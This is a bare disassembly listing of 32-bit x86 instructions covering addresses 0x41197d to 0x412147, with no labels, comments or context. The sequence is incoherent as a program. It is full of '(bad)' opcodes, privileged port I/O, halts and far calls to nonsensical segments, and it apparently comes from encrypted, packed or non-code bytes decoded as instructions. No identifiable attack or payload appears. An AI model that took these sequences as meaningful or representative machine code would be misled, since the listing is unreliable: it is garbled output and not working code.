  41197d:	push   esi
  41197e:	repnz push ecx
  411980:	mov    dl,0x8e
  411982:	sub    al,0x10
  411984:	mov    DWORD PTR [ecx],esi
  411986:	aam    0x1f
  411988:	pop    ecx
  411989:	test   eax,0x91a5674f
  41198e:	out    0x61,al
  411990:	les    esi,FWORD PTR [ebp+eiz*2-0x3226daa7]
  411997:	cli    
  411998:	mov    esi,0x677d47bb
  41199d:	outs   dx,BYTE PTR ds:[esi]
  41199e:	shl    DWORD PTR [esi],cl
  4119a0:	sbb    eax,0x5e844878
  4119a5:	sub    eax,0x1734f1bb
  4119aa:	call   0x2e6bd4ac
  4119af:	add    BYTE PTR [esi-0x53adac5a],bl
  4119b5:	mov    ah,ah
  4119b7:	push   DWORD PTR [ebx-0x3a]
  4119ba:	shr    esp,cl
  4119bc:	mov    dh,0xaa
  4119be:	out    0xd0,al
  4119c0:	cmp    al,BYTE PTR [ebp+ebp*2+0x34]
  4119c4:	add    bh,BYTE PTR [edx+edx*4+0x40de5978]
  4119cb:	mov    esi,0x110a1527
  4119d0:	dec    edx
  4119d1:	ficomp DWORD PTR [edi]
  4119d3:	sub    BYTE PTR [esi+0x60],ah
  4119d6:	icebp  
  4119d7:	outs   dx,DWORD PTR ds:[esi]
  4119d8:	fld    DWORD PTR [ebp-0x23ab26de]
  4119de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119df:	sbb    al,0x6b
  4119e1:	(bad)  
  4119e3:	dec    ecx
  4119e4:	pop    ecx
  4119e5:	inc    ebp
  4119e6:	jo     0x411a4e
  4119e8:	and    esp,DWORD PTR [eax-0x4b]
  4119eb:	ret    0x2fe5
  4119ee:	adc    ah,BYTE PTR [ecx-0x59]
  4119f1:	inc    eax
  4119f2:	ror    dh,1
  4119f4:	or     eax,ebx
  4119f6:	cmp    al,0x3b
  4119f8:	lods   al,BYTE PTR ds:[esi]
  4119f9:	add    al,0x42
  4119fb:	fs in  eax,dx
  4119fd:	or     bl,dh
  4119ff:	mov    dl,ch
  411a01:	xlat   BYTE PTR ds:[ebx]
  411a02:	int    0x8a
  411a04:	rcr    DWORD PTR [ecx-0x10],1
  411a07:	je     0x411a09
  411a09:	inc    edx
  411a0a:	cmp    eax,DWORD PTR [edi]
  411a0c:	fsub   st,st(7)
  411a0e:	js     0x4119af
  411a10:	gs jne 0x411a48
  411a13:	xlat   BYTE PTR ds:[ebx]
  411a14:	std    
  411a15:	pop    ebx
  411a16:	loop   0x411a96
  411a18:	push   0x77
  411a1a:	push   cs
  411a1b:	cmp    BYTE PTR [esi],dh
  411a1d:	hlt    
  411a1e:	inc    edx
  411a1f:	adc    BYTE PTR [ebx+0x1b],dl
  411a22:	loope  0x4119b8
  411a24:	inc    edi
  411a25:	cmc    
  411a26:	adc    al,0xf6
  411a28:	sbb    al,0x38
  411a2a:	add    al,0x84
  411a2c:	or     DWORD PTR [ecx-0x29],esi
  411a2f:	pop    edi
  411a30:	mov    eax,DWORD PTR [edx+0x12ddd301]
  411a36:	mov    ebx,DWORD PTR ds:0x4971b0c0
  411a3c:	mov    esi,DWORD PTR ds:0xd29d3bf2
  411a42:	ss call 0x33d0:0x8752e9
  411a4a:	repnz (bad) 
  411a4c:	iretw  
  411a4e:	jmp    0x411ac5
  411a50:	adc    eax,0xc1210744
  411a55:	xor    eax,0xcb669fee
  411a5a:	add    ebp,DWORD PTR [eax]
  411a5c:	ror    BYTE PTR [ecx-0x514e9d8e],0x62
  411a63:	adc    ecx,DWORD PTR [edx+0x33]
  411a66:	(bad)  
  411a68:	stc    
  411a69:	mov    BYTE PTR [edi-0x3485edf7],0x1b
  411a70:	clc    
  411a71:	cmp    eax,0x7ea47211
  411a76:	add    ah,BYTE PTR [ebp+0xd]
  411a79:	adc    al,0x54
  411a7b:	mov    ah,0xc1
  411a7d:	lods   eax,DWORD PTR ds:[esi]
  411a7e:	push   edx
  411a7f:	fisttp DWORD PTR [ebx-0x37]
  411a82:	dec    edx
  411a83:	mov    ebp,0xc3396b62
  411a88:	jle    0x411b03
  411a8a:	nop
  411a8b:	adc    ebp,eax
  411a8d:	or     eax,0x4c94da5d
  411a92:	daa    
  411a93:	rol    DWORD PTR [edi-0x50],0x2a
  411a97:	dec    edi
  411a98:	push   ds
  411a99:	mov    eax,0xd11dfb1a
  411a9e:	dec    esi
  411a9f:	dec    ebx
  411aa0:	test   eax,0x9730cf4e
  411aa5:	jno    0x411b0f
  411aa7:	xlat   BYTE PTR ds:[ebx]
  411aa8:	jp     0x411a63
  411aaa:	cmp    ebp,edi
  411aac:	sar    BYTE PTR [edi-0x5929cbef],1
  411ab2:	and    ch,BYTE PTR [edx+0x4de069a9]
  411ab8:	xchg   ebp,eax
  411ab9:	mov    DWORD PTR [esi-0x18],edx
  411abc:	mov    al,0x18
  411abe:	pushf  
  411abf:	shl    DWORD PTR [esi],0xc
  411ac2:	jae    0x411aff
  411ac4:	rcr    ebp,cl
  411ac6:	jae    0x411a9b
  411ac8:	shl    DWORD PTR [ebx],0x49
  411acb:	or     al,0x60
  411acd:	popa   
  411ace:	and    eax,0x1c2557d9
  411ad3:	icebp  
  411ad4:	cwde   
  411ad5:	loopne 0x411b27
  411ad7:	enter  0x9195,0xfd
  411adb:	pop    ds
  411adc:	mov    eax,ds:0x5cd0e6f6
  411ae1:	jno    0x411b23
  411ae3:	cmp    BYTE PTR [ebp+0x76832838],0x4a
  411aea:	fistp  DWORD PTR [eax]
  411aec:	jl     0x411a9d
  411aee:	add    DWORD PTR [esp+eiz*8+0x68332198],ebp
  411af5:	or     dl,ah
  411af7:	pop    ebp
  411af8:	push   ds
  411af9:	inc    ebx
  411afa:	or     ebx,DWORD PTR [esi+0x1503582c]
  411b00:	aas    
  411b01:	xchg   esp,eax
  411b02:	imul   eax,DWORD PTR [eax],0x3c11ca3
  411b08:	or     cl,BYTE PTR [ecx+0x34]
  411b0b:	call   0x8635:0xe97f1356
  411b12:	scas   al,BYTE PTR es:[edi]
  411b13:	mov    dh,al
  411b15:	outs   dx,DWORD PTR ds:[esi]
  411b16:	push   esi
  411b17:	call   0x911f001a
  411b1c:	icebp  
  411b1d:	retf   0x16a7
  411b20:	cmp    al,0xa8
  411b22:	je     0x411ac5
  411b24:	(bad)  
  411b25:	leave  
  411b26:	mov    edx,0x48214258
  411b2b:	lds    eax,FWORD PTR [ecx+0x54949677]
  411b31:	xchg   ecx,eax
  411b32:	inc    ebp
  411b33:	and    ebp,DWORD PTR [edx]
  411b35:	mov    ecx,0x9d0c48a0
  411b3a:	shl    DWORD PTR [edx-0x7f],1
  411b3d:	or     edi,edx
  411b3f:	cwde   
  411b40:	fldpi  
  411b42:	ja     0x411b60
  411b44:	mov    esi,0xad9d96b0
  411b49:	(bad)  
  411b4a:	lock pop esp
  411b4c:	pop    edi
  411b4d:	out    dx,eax
  411b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b4f:	jns    0x411adc
  411b51:	jp     0x411ad8
  411b53:	mov    dh,0xef
  411b55:	retf   
  411b56:	mov    ebp,0x2fc6e406
  411b5b:	hlt    
  411b5c:	in     al,dx
  411b5d:	ins    BYTE PTR es:[edi],dx
  411b5e:	mov    ebx,0xc9734eef
  411b63:	xchg   DWORD PTR [esp+ecx*4+0x24513112],ecx
  411b6a:	jge    0x411bbb
  411b6c:	js     0x411b4a
  411b6e:	pop    edi
  411b6f:	loope  0x411b7a
  411b71:	call   0x473c:0x365111ed
  411b78:	in     al,dx
  411b79:	cmp    BYTE PTR [edx+0x40cba990],al
  411b7f:	(bad)  
  411b80:	ja     0x411b91
  411b82:	xor    eax,0xd851ce44
  411b87:	push   ds
  411b88:	ss pop esi
  411b8a:	add    bl,BYTE PTR [esi+ebp*2-0x53]
  411b8e:	ds pushf 
  411b90:	dec    esi
  411b91:	mov    ebx,0x262f6380
  411b96:	test   eax,0x5126fc02
  411b9b:	inc    esp
  411b9c:	jle    0x411b96
  411b9e:	pop    esp
  411b9f:	add    BYTE PTR [edx+0x412863bf],dh
  411ba5:	xchg   edi,eax
  411ba6:	imul   DWORD PTR [eax-0x6353f2aa]
  411bac:	fs inc eax
  411bae:	fstp   DWORD PTR [edx+0x79]
  411bb1:	aad    0x1a
  411bb3:	cwde   
  411bb4:	imul   esp,DWORD PTR [ecx+0x3b],0x2d566cff
  411bbb:	fs inc ebx
  411bbd:	(bad)  
  411bbe:	xchg   edx,eax
  411bbf:	test   BYTE PTR [edi],ch
  411bc1:	mov    ch,0xa
  411bc3:	dec    edx
  411bc4:	jo     0x411bf3
  411bc6:	xlat   BYTE PTR ds:[ebx]
  411bc7:	arpl   WORD PTR [ebx+0x54],sp
  411bca:	mov    eax,ebp
  411bcc:	mov    al,0xba
  411bce:	arpl   WORD PTR [ebx],dx
  411bd0:	psubd  mm2,mm4
  411bd3:	pop    ebx
  411bd4:	int3   
  411bd5:	ss mov dh,0x1d
  411bd8:	sub    edi,DWORD PTR [ecx+0x6e]
  411bdb:	jge    0x411bd4
  411bdd:	jecxz  0x411bcc
  411bdf:	sub    ebp,ebp
  411be1:	xor    eax,0x71c793e
  411be6:	adc    BYTE PTR [ecx-0x43],ah
  411be9:	int    0x25
  411beb:	pushw  0x5f5f
  411bef:	sbb    ch,BYTE PTR [ebx-0x74]
  411bf2:	push   ds
  411bf3:	cmc    
  411bf4:	xchg   ebx,eax
  411bf5:	(bad)
  411bf8:	mov    eax,ds:0xb12c73fd
  411bfd:	inc    edx
  411bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bff:	or     BYTE PTR [edx],dh
  411c01:	jecxz  0x411c48
  411c03:	push   cs
  411c04:	inc    ebp
  411c05:	jae    0x411bab
  411c07:	loopne 0x411bf7
  411c09:	xchg   BYTE PTR [ebp-0x6afe720c],bl
  411c0f:	jge    0x411bfc
  411c11:	and    ch,BYTE PTR [ebx]
  411c13:	and    BYTE PTR [ebx+0x2dca41c],0xe6
  411c1a:	shl    ah,cl
  411c1c:	sbb    edi,0xffffffe7
  411c1f:	jbe    0x411c91
  411c21:	mov    ebx,0x20f57bf
  411c26:	leave  
  411c27:	jl     0x411c7f
  411c29:	adc    BYTE PTR ds:0x1758e4e9,bl
  411c2f:	daa    
  411c30:	fs xchg esp,eax
  411c32:	call   0x4300:0x636467c7
  411c39:	ret    
  411c3a:	sub    al,al
  411c3c:	push   cs
  411c3d:	xor    al,0xa5
  411c3f:	popf   
  411c40:	scas   al,BYTE PTR es:[edi]
  411c41:	jno    0x411c91
  411c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c44:	fdivr  DWORD PTR [ebx+0x182c51a1]
  411c4a:	scas   eax,DWORD PTR es:[edi]
  411c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c4c:	gs cmp eax,0xd66a3845
  411c52:	sbb    DWORD PTR [edx],ebx
  411c54:	mov    esp,0x713aabd1
  411c59:	out    dx,eax
  411c5a:	pop    edi
  411c5b:	add    DWORD PTR gs:[ecx-0x4085ba4e],0x68976de5
  411c66:	daa    
  411c67:	adc    al,0xfb
  411c69:	scas   eax,DWORD PTR es:[edi]
  411c6a:	ins    BYTE PTR es:[edi],dx
  411c6b:	mov    ebx,0x1cf01c51
  411c70:	or     DWORD PTR [ebp-0x60],0xffffffcd
  411c74:	jns    0x411c6a
  411c76:	xor    eax,0xdec2a43d
  411c7b:	mov    ch,0x27
  411c7d:	mov    esi,0xfd8f3913
  411c82:	fisub  DWORD PTR [eax]
  411c84:	pop    es
  411c85:	or     dh,BYTE PTR [edx-0x7d6537e4]
  411c8b:	rol    ch,0x86
  411c8e:	and    DWORD PTR [eax+0x3da89e32],ebx
  411c94:	jle    0x411c8e
  411c96:	push   edi
  411c97:	lahf   
  411c98:	inc    edx
  411c99:	and    BYTE PTR [ebp-0x70],bl
  411c9c:	std    
  411c9d:	xchg   ecx,eax
  411c9e:	jnp    0x411cb2
  411ca0:	xchg   edi,eax
  411ca1:	jge    0x411c62
  411ca3:	ja     0x411ce7
  411ca5:	or     eax,0x1b131755
  411caa:	cmc    
  411cab:	js     0x411c9f
  411cad:	sbb    DWORD PTR [ecx*4+0x6436b4ff],0x36
  411cb5:	jnp    0x411c37
  411cb7:	add    al,0x71
  411cb9:	xchg   esp,esi
  411cbb:	sbb    bh,BYTE PTR [edx]
  411cbd:	push   edi
  411cbe:	mov    ebx,0x11316223
  411cc3:	mov    al,ds:0x19f60749
  411cc8:	rcr    BYTE PTR [edi-0x211de89a],cl
  411cce:	fisubr DWORD PTR [eax-0x17]
  411cd1:	jne    0x411c88
  411cd3:	arpl   WORD PTR [esi+0x1d906f35],si
  411cd9:	cmp    al,0x4a
  411cdb:	mov    eax,0x6f15551e
  411ce0:	call   0x3ba:0x6bbd2d04
  411ce7:	pop    esi
  411ce8:	dec    edx
  411ce9:	out    0x9b,eax
  411ceb:	idiv   DWORD PTR [eax]
  411ced:	out    0x8d,al
  411cef:	hlt    
  411cf0:	outs   dx,BYTE PTR ds:[esi]
  411cf1:	stos   DWORD PTR es:[edi],eax
  411cf2:	imul   ebx,DWORD PTR [ebp+0x3bc97e51],0x4e69890b
  411cfc:	addr16 (bad) 
  411cfe:	in     al,dx
  411cff:	ret    0xde04
  411d02:	add    ebx,DWORD PTR [esi-0x15]
  411d05:	jmp    0x5f58:0xf0aebc17
  411d0c:	stos   BYTE PTR es:[edi],al
  411d0d:	int3   
  411d0e:	out    0x84,eax
  411d10:	imul   eax,DWORD PTR [ebp-0xd515197],0x79c53a8a
  411d1a:	jle    0x411d90
  411d1c:	push   ss
  411d1d:	mov    cl,0x2f
  411d1f:	push   eax
  411d20:	cli    
  411d21:	push   edx
  411d22:	mov    eax,ds:0x3898b5d7
  411d27:	clc    
  411d28:	lahf   
  411d29:	jo     0x411d88
  411d2b:	jno    0x411d10
  411d2d:	push   edi
  411d2e:	sub    eax,0xde458202
  411d33:	imul   edi,DWORD PTR [ecx],0x35b28900
  411d39:	jns    0x411d03
  411d3b:	sub    al,0xc5
  411d3d:	(bad)  
  411d3e:	jne    0x411d6a
  411d40:	mov    ch,0xc1
  411d42:	mov    edx,fs
  411d44:	sar    BYTE PTR [eax+ebp*4+0x22db694d],cl
  411d4b:	icebp  
  411d4c:	pop    edi
  411d4d:	cdq    
  411d4e:	maxps  xmm5,XMMWORD PTR [ecx-0x3515aba4]
  411d55:	daa    
  411d56:	or     DWORD PTR [esi-0x10feee6],esi
  411d5c:	div    DWORD PTR [ecx-0x39]
  411d5f:	adc    al,0x57
  411d61:	clc    
  411d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d63:	scas   al,BYTE PTR es:[edi]
  411d64:	rcl    DWORD PTR [ecx-0x2180cc61],1
  411d6a:	popa   
  411d6b:	shl    BYTE PTR [ebp-0x1b],0xa4
  411d6f:	and    DWORD PTR [ebp-0x69],0x8dc43f61
  411d76:	mov    esi,0x7dec61c9
  411d7b:	add    DWORD PTR [eax],0x7226fd6d
  411d81:	and    bh,0x62
  411d84:	std    
  411d85:	sub    eax,0x8b3e15ef
  411d8a:	xchg   ebp,eax
  411d8b:	loop   0x411d46
  411d8d:	and    BYTE PTR [esi],bh
  411d8f:	jno    0x411d89
  411d91:	aaa    
  411d92:	mov    DWORD PTR [ecx+0x36],0xf9299a8e
  411d99:	shl    DWORD PTR [eax],1
  411d9b:	mov    al,0x73
  411d9d:	mov    bh,0x86
  411d9f:	test   al,0x21
  411da1:	xchg   ebp,eax
  411da2:	jl     0x411dd0
  411da4:	jmp    0x411db4
  411da6:	outs   dx,BYTE PTR ds:[esi]
  411da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411da8:	xchg   DWORD PTR [edx-0x17],edx
  411dab:	ds inc esi
  411dad:	cmp    al,0x66
  411daf:	sahf   
  411db0:	data16 mov al,0x99
  411db3:	xor    al,0xbf
  411db5:	jmp    0x411d58
  411db7:	inc    eax
  411db8:	add    eax,0xf4525b5e
  411dbd:	imul   esi,ebx,0xffffff8f
  411dc0:	mov    ebp,ecx
  411dc2:	and    al,0x84
  411dc4:	pop    edx
  411dc5:	clc    
  411dc6:	add    DWORD PTR [eax+0x28],ecx
  411dc9:	push   esp
  411dca:	fwait
  411dcb:	and    bh,cl
  411dcd:	ret    0xadc
  411dd0:	xchg   ebp,eax
  411dd1:	push   es
  411dd2:	enter  0xebc1,0x8a
  411dd6:	inc    edi
  411dd7:	call   0xe740:0x32c4ccdf
  411dde:	cmp    DWORD PTR [ebp+0x14],edi
  411de1:	mov    bh,0x30
  411de3:	jmp    0x3eb:0xb675c2d7
  411dea:	dec    esi
  411deb:	mov    edi,0x36f5bb49
  411df0:	mov    esp,0x7cf980dd
  411df5:	jbe    0x411da5
  411df7:	div    DWORD PTR [ecx-0x41]
  411dfa:	(bad)  
  411dfb:	sub    BYTE PTR [eax-0x5f],al
  411dfe:	retw   
  411e00:	sbb    BYTE PTR [ecx],dl
  411e02:	(bad)  
  411e03:	stc    
  411e04:	add    ebx,DWORD PTR [eax+esi*4]
  411e07:	aaa    
  411e08:	cmp    ebx,0x6
  411e0b:	sbb    DWORD PTR [ecx+0x3b],eax
  411e0e:	push   ds
  411e0f:	jecxz  0x411e4c
  411e11:	mov    ds:0x4852d982,eax
  411e16:	(bad)  [ecx]
  411e18:	pop    edi
  411e19:	mov    esp,0x582c9aed
  411e1e:	ja     0x411e1d
  411e20:	div    DWORD PTR [edx+0x1]
  411e23:	pop    ss
  411e24:	ss pop esi
  411e26:	sbb    ecx,edx
  411e28:	imul   edx,DWORD PTR [eax+0x71],0x8db324d4
  411e2f:	inc    edx
  411e30:	mov    bh,0xd5
  411e32:	adc    BYTE PTR [ecx+0x4c],bl
  411e35:	dec    ecx
  411e36:	sub    eax,DWORD PTR [esi+eax*4+0x34]
  411e3a:	sbb    al,0x9a
  411e3c:	(bad)  
  411e3d:	pop    ss
  411e3e:	mov    edi,0xe527f278
  411e43:	in     eax,dx
  411e44:	dec    edi
  411e45:	inc    esp
  411e46:	mov    esp,0xfdb121a
  411e4b:	mov    edx,es
  411e4d:	add    eax,0xc09fe5fa
  411e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e53:	mov    ah,0xcc
  411e55:	test   al,0x59
  411e57:	jo     0x411eb0
  411e59:	and    dl,BYTE PTR [esi+0x46]
  411e5c:	push   0xffffffdc
  411e5e:	jecxz  0x411ec6
  411e60:	cmp    dl,dl
  411e62:	or     BYTE PTR [esi-0x15],0x4b
  411e66:	ds mov esi,edi
  411e69:	or     eax,0xc30be4ea
  411e6e:	lds    ecx,FWORD PTR [esi+0x5470d8af]
  411e74:	loope  0x411ef0
  411e76:	ins    DWORD PTR es:[edi],dx
  411e77:	mov    DWORD PTR [eax+0x61],0x1dfe27ee
  411e7e:	cs adc dl,dh
  411e81:	stos   DWORD PTR es:[edi],eax
  411e82:	jae    0x411f00
  411e84:	add    al,0xa4
  411e86:	sub    bh,BYTE PTR [ebp+0x59]
  411e89:	test   DWORD PTR [esp+eax*4-0xb],eax
  411e8d:	fs mov edx,0xd56d5171
  411e93:	ret    0xc3b0
  411e96:	push   edx
  411e97:	dec    esi
  411e98:	jp     0x411f05
  411e9a:	push   ds
  411e9b:	mov    ds:0x41929e81,eax
  411ea0:	jnp    0x411e8f
  411ea2:	adc    BYTE PTR [ebx-0x4d],dh
  411ea5:	or     al,0x53
  411ea7:	out    0xd8,eax
  411ea9:	adc    DWORD PTR [eax-0x6eeaf6f2],ebp
  411eaf:	test   al,0x22
  411eb1:	(bad)  
  411eb2:	outs   dx,DWORD PTR ds:[esi]
  411eb3:	xchg   esp,eax
  411eb4:	clc    
  411eb5:	mov    esi,0xf0351ba7
  411eba:	dec    ebp
  411ebb:	inc    esi
  411ebc:	pop    edx
  411ebd:	gs enter 0xa061,0x5
  411ec2:	scas   eax,DWORD PTR es:[edi]
  411ec3:	adc    al,0xa1
  411ec5:	adc    bh,BYTE PTR [ebp+edi*8+0x1e]
  411ec9:	mov    ebx,0x214c8a5c
  411ece:	add    BYTE PTR [ebp+0x11],0x35
  411ed2:	fcomp  DWORD PTR [ebx]
  411ed4:	fiadd  WORD PTR [ecx+0x14]
  411ed7:	dec    esp
  411ed8:	(bad)  
  411ed9:	mov    al,ds:0xec3cf69f
  411ede:	jl     0x411ec8
  411ee0:	mov    ch,0x64
  411ee2:	sub    bl,dh
  411ee4:	mov    DWORD PTR [eax+0x350d9f92],edi
  411eea:	sar    BYTE PTR [esi+0x34],cl
  411eed:	inc    ecx
  411eee:	or     ebp,DWORD PTR ds:0xade24985
  411ef4:	sbb    BYTE PTR [ebx-0x6],0x1
  411ef8:	adc    dl,BYTE PTR [eax-0x512309a]
  411efe:	add    BYTE PTR [edx-0x44],bl
  411f01:	fcmovne st,st(0)
  411f03:	nop
  411f04:	dec    edi
  411f05:	ins    BYTE PTR es:[edi],dx
  411f06:	int3   
  411f07:	lock push edx
  411f09:	jbe    0x411f55
  411f0b:	pop    es
  411f0c:	(bad)  
  411f0d:	in     al,dx
  411f0e:	mov    al,0xc3
  411f10:	arpl   di,di
  411f12:	pop    esp
  411f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f14:	adc    eax,0x980aedf6
  411f19:	push   esi
  411f1a:	loop   0x411ee6
  411f1c:	dec    edi
  411f1d:	pop    ds
  411f1e:	shl    BYTE PTR ds:0x9adecd1,0x9f
  411f25:	or     eax,0x6795e7c9
  411f2a:	retf   0x7f6
  411f2d:	stos   DWORD PTR es:[edi],eax
  411f2e:	jmp    0x411f21
  411f30:	cdq    
  411f31:	pop    esp
  411f32:	or     eax,0xb499c305
  411f37:	fst    DWORD PTR [ebx]
  411f39:	ins    DWORD PTR es:[edi],dx
  411f3a:	adc    BYTE PTR [eax],ah
  411f3c:	cmp    al,0xba
  411f3e:	mov    esp,0xac30db6a
  411f43:	pop    ss
  411f44:	(bad)  
  411f45:	and    BYTE PTR [esi+0x55],bl
  411f48:	and    al,0x90
  411f4a:	adc    eax,0x50675ba1
  411f4f:	sbb    DWORD PTR [esi],0x3c607630
  411f55:	dec    esp
  411f56:	push   ebx
  411f57:	dec    edi
  411f58:	mov    ah,0xb2
  411f5a:	inc    ebx
  411f5b:	cmp    esp,DWORD PTR [ebx+0x7c92534f]
  411f61:	inc    esp
  411f62:	dec    esi
  411f63:	push   ds
  411f64:	gs push 0xffffffb1
  411f67:	jp     0x411f86
  411f69:	mov    edx,0x9c455585
  411f6e:	loopne 0x411f9c
  411f70:	push   ss
  411f71:	cli    
  411f72:	scas   al,BYTE PTR es:[edi]
  411f73:	jg     0x411fd9
  411f75:	fistp  QWORD PTR [ebp-0x4d]
  411f78:	outs   dx,DWORD PTR ds:[esi]
  411f79:	loope  0x411ff7
  411f7b:	std    
  411f7c:	xor    DWORD PTR [ebp-0x34a716be],esp
  411f82:	mov    DWORD PTR [eax+0x33],eax
  411f85:	sbb    cl,BYTE PTR [eax+ebx*8+0x74]
  411f89:	fmul   QWORD PTR [esi+0x2f566efc]
  411f8f:	xchg   edi,eax
  411f90:	mov    al,0xb2
  411f92:	dec    esi
  411f93:	xchg   ecx,eax
  411f94:	in     eax,dx
  411f95:	xchg   ecx,eax
  411f96:	cld    
  411f97:	jmp    0x411f22
  411f99:	(bad)  [eax-0x37]
  411f9c:	mov    ebp,0x9fc6c022
  411fa1:	fcom   DWORD PTR [edi+0x4b]
  411fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fa5:	add    ebp,DWORD PTR [esi+0x5b]
  411fa8:	push   ds
  411fa9:	xor    eax,DWORD PTR gs:[ecx+edx*8]
  411fad:	pop    ecx
  411fae:	outs   dx,BYTE PTR ds:[esi]
  411faf:	xchg   ecx,eax
  411fb0:	add    BYTE PTR [esi+0x75],0x29
  411fb4:	gs mov ah,0x6e
  411fb7:	(bad)  
  411fb8:	xchg   edi,eax
  411fb9:	mov    esp,0xa1e646a5
  411fbe:	mov    eax,0xbc55b46c
  411fc3:	and    DWORD PTR [edx],eax
  411fc5:	mov    edx,cs
  411fc7:	dec    ebx
  411fc8:	xchg   edi,eax
  411fc9:	push   esp
  411fca:	js     0x412016
  411fcc:	jbe    0x411fe6
  411fce:	adc    eax,0x6964ee11
  411fd3:	mov    ah,0x4a
  411fd5:	(bad)  
  411fd6:	call   0x5b140fd2
  411fdb:	fwait
  411fdc:	test   al,0x7d
  411fde:	sub    al,0x5a
  411fe0:	call   FWORD PTR [eax+0x3b]
  411fe3:	push   ss
  411fe4:	mov    al,0x75
  411fe6:	dec    esp
  411fe7:	push   eax
  411fe8:	test   BYTE PTR [ecx+ecx*1+0x576139b7],ch
  411fef:	inc    ecx
  411ff0:	scas   eax,DWORD PTR es:[edi]
  411ff1:	out    0xc2,al
  411ff3:	mov    ebp,0xc38b408d
  411ff8:	cmp    edx,ebx
  411ffa:	sahf   
  411ffb:	in     al,0x4a
  411ffd:	push   ebx
  411ffe:	jo     0x412057
  412000:	pop    eax
  412001:	mov    ds:0x3421a7ae,eax
  412006:	stc    
  412007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412008:	retf   0x4d42
  41200b:	adc    al,0x8a
  41200d:	push   0xffffffc0
  41200f:	and    ah,BYTE PTR ds:0x5d47d07b
  412015:	pop    eax
  412016:	das    
  412017:	jb     0x411fac
  412019:	sbb    al,0x1e
  41201b:	in     eax,dx
  41201c:	sub    al,0x33
  41201e:	out    0xa7,al
  412020:	sbb    eax,ebx
  412022:	xor    ecx,esp
  412024:	jns    0x411fee
  412026:	jp     0x41201a
  412028:	sbb    ah,bh
  41202a:	mov    ah,0x28
  41202c:	pop    eax
  41202d:	cmp    al,0x89
  41202f:	(bad)  
  412030:	repz sub eax,0x15db1238
  412036:	repnz mov edi,0x9921c746
  41203c:	mov    al,ds:0x9f705a17
  412041:	loop   0x412006
  412043:	and    edx,DWORD PTR [ecx]
  412045:	(bad)  
  412046:	sbb    al,0xde
  412048:	or     BYTE PTR [esp+edi*1+0xb],ch
  41204c:	jnp    0x41203d
  41204e:	push   ss
  41204f:	imul   ecx,DWORD PTR [edx],0xffffffd2
  412052:	adc    al,0xcf
  412054:	jae    0x412083
  412056:	jg     0x412045
  412058:	sub    cl,BYTE PTR [edi]
  41205a:	jnp    0x4120cf
  41205c:	mov    al,0x72
  41205e:	stos   BYTE PTR es:[edi],al
  41205f:	les    ecx,FWORD PTR [edi]
  412061:	dec    ebx
  412062:	sbb    esi,DWORD PTR gs:[edx+0xe]
  412066:	pop    ss
  412067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412068:	mov    cl,0x20
  41206a:	fbld   TBYTE PTR [esi-0x6]
  41206d:	les    ebp,FWORD PTR [edi+edi*1]
  412070:	jmp    0x468d:0x123c89b8
  412077:	nop
  412078:	sub    ch,BYTE PTR [ecx]
  41207a:	ins    DWORD PTR es:[edi],dx
  41207b:	les    eax,FWORD PTR ds:0x33b8a1e
  412081:	add    ch,bl
  412083:	jl     0x4120d7
  412085:	out    0x49,al
  412087:	mov    DWORD PTR [edi],ebx
  412089:	mov    ch,0xae
  41208b:	popf   
  41208c:	add    DWORD PTR [esp+eiz*8-0x3268b5a3],0xffffff92
  412094:	pop    esp
  412095:	sub    bl,dl
  412097:	aaa    
  412098:	xchg   ebx,eax
  412099:	xor    cl,cl
  41209b:	add    eax,0xd4c371f4
  4120a0:	ds pop ecx
  4120a2:	addr16 ja 0x41202e
  4120a5:	ins    DWORD PTR es:[edi],dx
  4120a6:	xchg   ecx,eax
  4120a7:	fstp   TBYTE PTR [edi+0x7b6d7100]
  4120ad:	out    dx,al
  4120ae:	fldcw  WORD PTR [ebx+edx*8]
  4120b1:	fisttp WORD PTR [esi+0x75]
  4120b4:	mov    eax,0x65321d28
  4120b9:	fs or  BYTE PTR gs:[edi],0xa7
  4120be:	outs   dx,DWORD PTR ds:[esi]
  4120bf:	inc    ebp
  4120c0:	sbb    eax,0x6591a0a3
  4120c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120c6:	(bad)  
  4120c7:	jmp    0x41204a
  4120c9:	pop    DWORD PTR [eax+ebp*2]
  4120cc:	add    BYTE PTR [edx+edi*4],0xbc
  4120d0:	repz call 0x95615ec7
  4120d6:	das    
  4120d7:	push   ss
  4120d8:	and    esi,eax
  4120da:	push   ss
  4120db:	xchg   DWORD PTR [esi],ebp
  4120dd:	mov    ecx,0x305c8964
  4120e2:	(bad)  
  4120e3:	call   0xb054:0x7fecfd0d
  4120ea:	into   
  4120eb:	call   0x4b0d2e9f
  4120f0:	inc    ebp
  4120f1:	pop    edi
  4120f2:	imul   esp,DWORD PTR [eax+0x4b121cc6],0xfabbeced
  4120fc:	pinsrw mm7,WORD PTR [eax],0x81
  412100:	call   0x8a13:0xad30152f
  412107:	or     eax,0xd28ddce5
  41210c:	retf   
  41210d:	add    BYTE PTR [ecx],cl
  41210f:	or     BYTE PTR [edi-0x1a],0x86
  412113:	adc    ebx,0x6eb5343d
  412119:	ins    DWORD PTR es:[edi],dx
  41211a:	fistp  DWORD PTR [esi]
  41211c:	mov    esi,0x4ea5f6e2
  412121:	sbb    eax,0xcc5ea70e
  412126:	cwde   
  412127:	je     0x4120c7
  412129:	inc    edi
  41212a:	and    bl,BYTE PTR [edx-0x5d]
  41212d:	sub    BYTE PTR [esi+0x3d],0x40
  412131:	dec    edi
  412132:	cmp    DWORD PTR [ecx+0x570d3d15],0x7d34b21
  41213c:	ss dec esp
  41213e:	and    dl,cl
  412140:	xor    esi,DWORD PTR [eax]
  412142:	dec    esi
  412143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412144:	cmp    al,BYTE PTR [edi-0x48]
  412147:	dec    edi
